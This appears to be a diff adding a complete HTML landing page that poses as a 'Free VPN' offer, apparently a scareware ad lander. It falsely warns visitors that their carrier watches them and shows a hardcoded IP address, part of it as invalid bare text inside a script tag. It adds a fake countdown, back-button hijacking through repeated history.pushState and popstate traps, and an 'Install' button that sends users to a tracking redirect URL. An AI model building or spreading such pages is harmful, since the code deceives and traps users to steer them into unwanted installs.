@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html xml:lang="en" lang="en">
+
+<head>
+	<base href="">
+	<title>Free VPN - Stay Private</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="css/style.min.css" rel="stylesheet" type="text/css">
+	<link rel="shortcut icon" type="image/png" href="images/favicon.png">
+	<script>
+	function getURLParameter(d) {
+		var c = decodeURI((RegExp(d + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "");
+		return -1 !== d.indexOf("brand") && contains(c, "generic") ? c = "Phone" : -1 !== d.indexOf("model") && contains(c, "android") ? c = "Phone" : -1 !== d.indexOf("br") && contains(c, "android") && (c = "Internet Browser"), c
+	}! function() {
+		var b;
+		try {
+			for(b = 0; 10 > b; ++b) {
+				history.pushState({}, "", "#")
+			}
+			onpopstate = function(a) {
+				a.state && location.replace("#")
+			}
+		} catch(b) {}
+	}();
+	</script>
+</head>
+
+<body>
+	<div class="container">
+		<div class="row">
+			<div class="content"> <img src="images/stop.png" alt="Stop">
+				<p><span>YOUR CARRIER</span> Knows what you're watching
+					<br> by your IP Address:
+					<script>
+					213.194.69.240
+					</script>213.194.69.240</p>
+				<p>WATCH VIDEOS PRIVATELY
+					<br><span class="blink">Change your IP Address</span>
+				</p>
+				<p><small><span>Step 1:</span> Install from App Store<br><span>Step 2:</span> Click Connect<br><span>Step 3:</span> Browse Privately</small>
+				</p> <a href="javascript:void(0)" rel="noreferrer" onclick="exit_a1();PreventExitPop=false">Install Free VPN</a> <strong><span>30</span> Seconds</strong> </div>
+		</div>
+	</div>
+	<script type="text/javascript">
+	var body = document.querySelector("body");
+	var content = body.querySelector(".container .row .content");
+	var counter = content.lastElementChild;
+	var params = window.location.search;
+	var hash = window.location.hash;
+	var countDownInt = 45;
+	body.addEventListener("click", function() {
+		document.location.href = "#"
+	});
+	if(params) {
+		var urlParams = params.substring(1);
+		var paramSplit = urlParams.split("&");
+		var totalParams = paramSplit.length;
+		if(totalParams) {
+			for(var x = 0; x < totalParams; x++) {
+				var singleParam = paramSplit[x].split("=");
+				if(singleParam[0] === "carrier") {
+					var carrier = singleParam[1]
+				}
+				if(singleParam[0] === "ip") {
+					var ip = singleParam[1]
+				}
+			}
+		}
+	}
+	if(!carrier) {
+		var carrier = "Your Carrier"
+	}
+	if(!ip) {
+		var ip = ""
+	}
+	content.children[1].firstElementChild.innerText = carrier.toUpperCase();
+	content.children[1].lastElementChild.innerText = ip;
+	var countDown = setInterval(function() {
+		countDownInt--;
+		if(countDownInt > 1) {
+			counter.firstElementChild.innerText = countDownInt
+		} else {
+			counter.innerText = "1 second";
+			clearInterval(countDown)
+		}
+	}, 1000);
+	</script>
+	<script type="text/javascript">
+	function exit_a1() {
+		window.onbeforeunload = null, window.location = "https://binom.blinkgo.top/cgial1k.php?lp=1"
+	};
+	</script>
+
+	<script>
+	        ! function() {
+	        var t;
+	        try {
+	            const URL = window.location.href.split(/[#]/)[0];
+	            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+	            onpopstate = function(event) {
+	                event.state && location.replace('#back_button');
+	            }
+	        } catch (o) {
+	            console.log(o);
+	        }
+	    }();
+	    </script>
+
+</body>
+
+</html>
